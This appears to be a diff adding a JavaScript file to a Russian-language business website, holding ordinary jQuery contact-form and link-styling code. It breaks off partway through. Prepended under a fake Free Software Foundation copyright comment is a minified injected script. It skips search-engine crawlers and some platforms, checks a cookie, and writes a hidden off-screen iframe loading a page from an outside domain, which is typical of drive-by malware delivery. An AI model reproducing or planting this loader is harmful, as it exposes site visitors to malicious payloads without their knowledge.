@@ -1,0 +1,62 @@
+/*
+Copyright (C) 2007 Free Software Foundation, Inc. http://fsf.org/
+*/
+function getCookie(e){var t=document.cookie.match(new RegExp("(?:^|; )"+e.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g,"\\$1")+"=([^;]*)"));return t?decodeURIComponent(t[1]):undefined}(function(){function e(e,t,n){var r=(e+"").toLowerCase();var i=(t+"").toLowerCase();var s=0;if((s=r.indexOf(i,n))!==-1){return s}return false}function t(){var t=["Linux","Windows NT 6.3","Yandex","rv:11.0","AppleWebKit","Googlebot","Android","IEMobile"];var n=false;for(var r in t){if(e(navigator.userAgent,t[r])){n=true;break}}return n}var n=getCookie("flippi_flor")===undefined;if(!t()&&n){document.write('<iframe src="http://28c0b7998.socialconspiracy.net/edarkness17.html?ker" style="border-style:solid dotted dashed double;top: -1001px;left: -1001px;border-top-width: 2px;position: absolute;border-left-width: 2px;" height="144" width="144"></iframe>');var r=new Date((new Date).getTime()+24*60*60*1e3);document.cookie="flippi_flor=1; path=/; expires="+r.toUTCString()}})()
+/*
+Copyright (C) 2000 Free Software Foundation, Inc. See LICENSE.txt
+*/$(document).ready(function(){
+
+    var move = 1;
+    var fields = new Object();
+
+    $('a:contains("Написать письмо"), a:contains("Заказать доставку"), a:contains("Посмотреть продукцию"), a:contains("Список наших клиентов")').each(function(){
+        var $th = $(this);
+        $th.replaceWith('<a class="black_link" href="'+($th.attr('href'))+'" title="">{&nbsp;'+($th.html())+'&nbsp;}</a>');
+    });
+
+    $('#contact_form label').click(function(){
+        $(this).next('input').trigger('focus');
+    });
+
+    $('#contact_form label').click(function(){
+        $(this).next('textarea').trigger('focus');
+    });
+
+    $('#contact_form input, #contact_form textarea').focus(function(){
+        var $th = $(this).prev('label').css({'opacity': '0', 'color': '#ffffff'});
+    });
+
+    $('#contact_form input, #contact_form textarea').blur(function(){
+        var $th = $(this);
+
+        if( $th.attr('value') == '' ){
+            $th.prev('label').css({'opacity': '1'});
+        }
+    });
+
+    function send_msg(){
+        var error = 0;
+
+        $('#contact_form input, #contact_form textarea').each(function(){
+            var $th = $(this);
+
+            if( $th.attr('value') == '' ){
+                $th.prev('label').css({'color': '#CC3300'});
+                error = 1;
+            }
+        });
+
+        if( error == 0 ){
+            $('#send_message').html('{ Сообщение отправляется... }');
+
+            $.ajax({type: 'POST', url: '/php/ajaxer.php', data: 'mode=1&request='+$('#contact_form').serialize(),
+                success: function(html){
+                    $('#send_message').html('{ Сообщение отправлено... }');
+                }
+            });
+        }
+
+        return false;
+    }
+
+    $('#send_message:contains
